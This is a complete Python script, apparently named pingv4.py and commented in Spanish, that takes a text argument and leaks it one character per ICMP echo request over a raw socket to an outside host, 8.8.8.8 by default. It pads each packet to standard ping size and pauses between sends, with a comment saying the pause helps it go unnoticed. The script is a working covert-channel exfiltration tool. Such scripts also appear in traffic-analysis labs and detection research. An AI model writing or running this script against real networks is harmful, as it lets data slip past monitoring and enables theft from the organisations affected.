import socket
import struct
import time
import sys

def checksum(source_string):
    # Función clásica para calcular el checksum de un paquete ICMP
    suma = 0
    count_to = (len(source_string) // 2) * 2
    count = 0
    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        suma = suma + this_val
        suma = suma & 0xffffffff
        count = count + 2
    if count_to < len(source_string):
        suma = suma + source_string[len(source_string) - 1]
        suma = suma & 0xffffffff
    suma = (suma >> 16) + (suma & 0xffff)
    suma = suma + (suma >> 16)
    respuesta = ~suma
    respuesta = respuesta & 0xffff
    respuesta = respuesta >> 8 | (respuesta << 8 & 0xff00)
    return respuesta

def enviar_ping_stealth(texto, destino="8.8.8.8"):
    # Protocolo ICMP
    icmp = socket.getprotobyname("icmp")
    
    try:
        # Crear socket crudo (Raw Socket). Requiere sudo.
        mi_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
    except PermissionError:
        print("Error: Debes ejecutar este script con sudo.")
        sys.exit(1)

    ID_paquete = 1234
    secuencia = 1

    for char in texto:
        # Construir cabecera ICMP (Tipo 8 = Echo Request, Código 0)
        # Formato "bbHHh": byte(tipo), byte(codigo), unsigned short(checksum), unsigned short(id), short(secuencia)
        cabecera_temporal = struct.pack("bbHHh", 8, 0, 0, ID_paquete, secuencia)
        
        # Datos: El carácter + padding de 47 bytes nulos (Total = 48 bytes como en un ping estándar)
        datos = char.encode('utf-8') + b'\x00' * 47
        
        # Calcular el checksum real uniendo cabecera temporal y datos
        mi_checksum = checksum(cabecera_temporal + datos)
        
        # Reconstruir la cabecera con el checksum correcto (usando socket.htons para el orden de bytes)
        cabecera_final = struct.pack("bbHHh", 8, 0, socket.htons(mi_checksum), ID_paquete, secuencia)
        
        # Paquete final a enviar
        paquete_icmp = cabecera_final + datos
        
        # Enviar
        mi_socket.sendto(paquete_icmp, (destino, 1))
        print("Sent 1 packets.")
        
        secuencia += 1
        time.sleep(1) # Pausa para no saturar y pasar desapercibido

    mi_socket.close()

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Uso: sudo python3 pingv4.py \"texto_cifrado\"")
        sys.exit(1)
    
    texto_enviar = sys.argv[1]
    enviar_ping_stealth(texto_enviar)
